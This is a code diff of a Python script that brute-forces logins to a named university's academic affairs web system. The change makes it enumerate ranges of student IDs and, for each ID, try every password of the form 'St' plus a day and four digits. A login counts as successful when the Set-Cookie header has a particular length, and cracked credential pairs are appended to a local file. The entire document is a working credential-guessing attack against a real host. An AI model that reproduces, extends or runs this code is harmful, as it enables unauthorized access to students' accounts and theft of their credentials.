@@ -1,6 +1,3 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-
 import requests
 import time
 
@@ -10,26 +7,36 @@ class JiaoWuChu:
         self.url = 'http://ded.nuaa.edu.cn/NetEAn/user/jwc_login_jk1.asp?usr='
         self.nuaaid = '0'
         self.passwd = '0'
+        self.yesno = 0
 
     def id(self, x):
-        x = str(x)
-        self.nuaaid = '0316' + x
+        for a in [101, 102, 103, 104, 105, 106, 201, 202, 203, 204, 205, 206, 301, 302, 303, 304, 305, 306, 401, 402, 403]:
+            self.nuaaid = x + str(a)
+            for b in range(1, 30):
+                self.nuaaid = self.nuaaid + str(b).zfill(2)
+                jiaowuchu.psd()
 
-
-    def psd(self, day, n):
-        day = str(str(day)).zfill(2)
-        n = str(str(n)).zfill(4)
-        str1 = str(day + n).zfill(6)
-        self.passwd = 'St' + str1
-
+    def psd(self):
+        for day in range(1, 32):
+            day = str(day)
+            if self.yesno == 1:
+                break
+            else:
+                for x in range(1, 10000):
+                    x = str(x)
+                    self.passwd = 'St' + day.zfill(2) + x.zfill(4)
+                    self.yesno = jiaowuchu.get()
+                    if self.yesno == 1:
+                        break
 
     def get(self):
         try:
-            Cookie_len = len(requests.get(self.url + self.nuaaid +'&pwd=' + self.passwd).headers['Set-Cookie'])
+            Cookie_len = len(requests.get(
+                self.url + self.nuaaid + '&pwd=' + self.passwd).headers['Set-Cookie'])
         except:
             print("Error")
             time.sleep(5)
-            a=jiaowuchu.get()
+            a = jiaowuchu.get()
         else:
             if Cookie_len == 331:
                 f = open('test.txt', 'a')
@@ -37,20 +44,14 @@ class JiaoWuChu:
                 f.write('---')
                 f.write(self.passwd + '\n')
                 f.close
-                exit()
+                return 1
             else:
                 print('%s---%s---wrong' % (self.nuaaid, self.passwd))
+                return 0
 
 
 if __name__ == '__main__':
     jiaowuchu = JiaoWuChu()
-    print('输入班级和学号，例如：20101')
-    idx = int(input())
-    jiaowuchu.id(idx)
-    for day in range(1, 32):
-        for n in range(0, 9999):
-            jiaowuchu.psd(day, n)
-            #time.sleep(0.3)
-            yesno = jiaowuchu.get()
-            if yesno == 'ok':
-                exit()
+    print('输入起始年份和学院，例如：0116')
+    x = input()
+    jiaowuchu.id(x)
